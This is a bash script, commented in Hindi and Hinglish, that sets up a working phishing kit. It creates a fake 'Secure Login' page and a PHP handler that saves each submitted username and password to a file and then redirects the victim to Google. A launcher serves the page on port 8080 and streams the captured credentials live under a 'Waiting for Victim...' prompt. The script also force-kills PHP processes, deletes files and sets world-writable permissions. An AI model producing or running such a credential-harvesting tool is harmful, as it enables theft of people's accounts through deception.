#!/bin/bash

# --- 1. CLEANUP & PREPARE (पुराना कचरा साफ) ---
clear
echo -e "\033[1;33m[*] Cleaning old files...\033[0m"
pkill -f php > /dev/null 2>&1
rm -rf auth/ server/ ip.txt usernames.txt php_error.log

# --- 2. CREATE PRO DIRECTORY STRUCTURE (जैसा स्क्रीनशॉट में था) ---
# Hum 'auth' folder banayenge jaise professional tools me '.sites' hota hai
echo -e "\033[1;33m[*] Creating Pro Folder Structure...\033[0m"
mkdir -p auth
mkdir -p logs

# --- 3. CREATE DUMMY LOGIN PAGE (ताकि Blank Screen न आए) ---
# Agar folder khali hoga to server band ho jata hai, isliye hum fake page banayenge
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        input { padding: 10px; margin: 10px; width: 80%; border-radius: 5px; border: none; }
        button { padding: 10px 20px; background-color: #00ff00; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🔒 Secure Login</h1>
    <form method="POST" action="login.php">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
EOF

# --- 4. CREATE LOGIN LOGIC (Data Capture Logic) ---
cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "Account: " . \$_POST['username'] . " | Password: " . \$_POST['password'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
?>
EOF

# --- 5. CREATE THE LAUNCHER (run.sh) ---
# Ye script ab 'auth' folder ko host karegi, root ko nahi.
cat > run.sh <<EOF
#!/bin/bash

# --- 🛠️ FIX PERMISSIONS (Universal Fix) ---
# System TMP folder use karne se permission error aata hai.
# Hum apna khud ka TMP folder use karenge.
mkdir -p \$HOME/.php_tmp
chmod 777 \$HOME/.php_tmp
export TMPDIR=\$HOME/.php_tmp

# --- 🎨 COLORS ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
RESET='\033[0m'

clear
echo -e "\${GREEN}╔══════════════════════════════════════╗\${RESET}"
echo -e "\${GREEN}║        ${CYAN}PRO SERVER LAUNCHER${GREEN}           ║\${RESET}"
echo -e "\${GREEN}╚══════════════════════════════════════╝\${RESET}"
echo ""

echo -e "\${YELLOW}[*] Starting PHP Server...${RESET}"

# --- 🚀 SERVER START COMMAND ---
# Hum 'auth' folder ko root (-t auth) bana rahe hain
php -S 0.0.0.0:8080 -t auth > logs/php.log 2>&1 &
PID=\$!
sleep 2

# --- CHECK STATUS ---
if ps -p \$PID > /dev/null; then
    echo -e "\${GREEN}[✔] Server Online!${RESET}"
    echo -e "\${CYAN}Link: http://localhost:8080${RESET}"
    
    # IP Address Check
    MYIP=\$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
    if [ ! -z "\$MYIP" ]; then
        echo -e "\${CYAN}Link: http://\$MYIP:8080${RESET}"
    fi

    echo -e "\${RED}[-] Press Ctrl + C to Exit${RESET}"
    echo ""
    echo -e "\${GREEN}Waiting for Victim...${RESET}"

    # LIVE LOGS
    tail -f usernames.txt logs/php.log --pid=\$PID 2>/dev/null | while read line; do
        if [[ "\$line" == *"Account"* ]]; then
             echo -e "\${RED}[!] \${line}\${RESET}"
             echo -e "\a"
        fi
    done
else
    echo -e "\${RED}[!] Server Failed to Start! Log Check Karein:\${RESET}"
    cat logs/php.log
fi
EOF

chmod +x run.sh
echo -e "\033[1;32m[✔] Setup Complete! All files created.\033[0m"
echo -e "\033[1;36m[*] Ab bas ye command chalao: \033[0m bash run.sh"
